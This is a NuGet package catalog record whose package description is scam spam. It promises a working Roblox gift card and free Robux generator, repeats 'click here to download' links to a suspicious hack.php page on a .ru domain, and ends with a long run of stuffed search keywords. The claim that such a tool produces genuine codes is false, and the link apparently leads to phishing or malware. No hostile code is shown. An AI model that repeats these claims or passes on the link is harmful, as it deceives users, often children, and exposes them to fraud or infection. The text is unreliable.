{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.11.35.00/_roblox-gift-card-generator-working-2022-version-yau.1.4.37.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "ecb86c15-34c1-4a4e-bf81-2d62a7e4f1db",
  "catalog:commitTimeStamp": "2022-01-26T11:35:00.3397924Z",
  "created": "2022-01-26T11:32:49.74Z",
  "description": "# _Roblox Gift Card Generator Working 2022 Version yau\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://9.bltadwin.ru/hack.php](http://9.bltadwin.ru/hack.php)\n\n\nRoblox Gift Card Generator Redeem Free Robux Access Free Roblox Robux Here >>>>>> download 1 minutes ago - Howdy, Get Free Robux  At internet, Roblox gift card code Generator works on Algorithm which Generates every Time random Code for you. Roblox Gift Card Codes From what it is, unused codes, how to Get it Now\" Gift Card Generator in | Roblox gifts, Roblox, Free gift card.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://9.bltadwin.ru/hack.php](http://9.bltadwin.ru/hack.php)\n\nRoblox gift card Generator is an online tool used for generating unique free Roblox gift card codes. We save the day for everyone who wishes to generate you free Roblox gift card codes that work. You can use this generated gift code while purchasing items from Roblox official site. Roblox Gift Card Generator Thanks to this fantastic Roblox Gift Card code generator,Roblox gift card generator is an online tool used for generating unique free Roblox gift card codes. Roblox Gift Card Code Generator. Choose Your Card. $25 Gift Card. $50 Gift Card. $ Gift Card. The Roblox Gift CardsRoblox Gift card generator is an online app.  · Roblox gift card generator is a tool, which is used to create genuine free codes against roblox gift cards. Roblox gift cards are the easiest way to load up on credit for robux or a premium subscription. Earn Free 10 Fortnite VBucks Gift Cards Codes Legally from download It’s great to get a free roblox gift card when playing roblox.\n\nroblox gift card generator no verification, roblox gift card generator script, roblox gift card generator 2021 no human verification, roblox gift card generator real, roblox gift card generator 2021, roblox gift card generator codes, roblox gift card generator page, roblox gift card generator 2022, roblox gift card generator and checker, roblox gift card generator alpha, roblox-giftcard/generator/alpha, roblox gift card generator no human verification, roblox gift card generator 2020, roblox gift card generator no human verification 2020, roblox gift card generator discord bot, roblox gift card generator valid, roblox gift card generator discord, real roblox gift card generator, roblox cards generator, roblox gift card generators, roblox gift card codes generator 2020 no human verification, roblox gift card codes generator no human verification, roblox gift card codes generator download, random roblox gift card codes generator, roblox gift card codes 2021 generator no human verification, code generator roblox gift card, roblox gift card generator download, roblox gift card code generator download, roblox 100 dollar gift card generator, roblox gift card gen, e roblox card, roblox gift card generator free, free roblox gift card generator no human verification, gift card generator for roblox, free roblox gift card generator 2021, free roblox gift card generator 2020, free roblox gift card generator no survey, roblox/gift/game/fast card generator, free roblox gift cards generator, free roblox card generator, fake roblox gift card generator, gift card roblox free gift card generator, roblox gift card generator without human verification, how to get free roblox gift cards no human verification, is roblox gift card generator real, is the robux generator real, are there any legit robux generators, are robux generators fake, is gift card generator real, roblox gift card randomizer, roblox gift card codes 2021 unused list generator, how to get free robux codes 2020 not expired, how to get free robux 2020 code, how to get free robux without buying a gift card, how to generate gift card codes, roblox gift card generator no verify, roblox gift card generator no survey 2020, roblox gift card number generator, roblox gift card codes generator no verification, roblox gift card generator online, roblox gift card generator no human verifi",
  "id": "_Roblox-Gift-Card-Generator-Working-2022-Version-yau",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T11:34:52.537Z",
  "listed": true,
  "packageHash": "X3wMLdH+4hcHtmaiNUrz76mH3umXE9rQAYE5HKqqSAQJChDaYFdaAzF91/lb7uYCs/yq79Xo+H1KRLeVHUwwVg==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11388,
  "published": "2022-01-26T11:32:49.74Z",
  "requireLicenseAcceptance": false,
  "title": "_Roblox-Gift-Card-Generator-Working-2022-Version-yau",
  "verbatimVersion": "1.4.37",
  "version": "1.4.37",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.11.35.00/_roblox-gift-card-generator-working-2022-version-yau.1.4.37.json#uxcvzmjuen.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1260,
      "fullName": "uxcvzmjuen.nuspec",
      "length": 4477,
      "name": "uxcvzmjuen.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.11.35.00/_roblox-gift-card-generator-working-2022-version-yau.1.4.37.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9468,
      "fullName": ".signature.p7s",
      "length": 9468,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}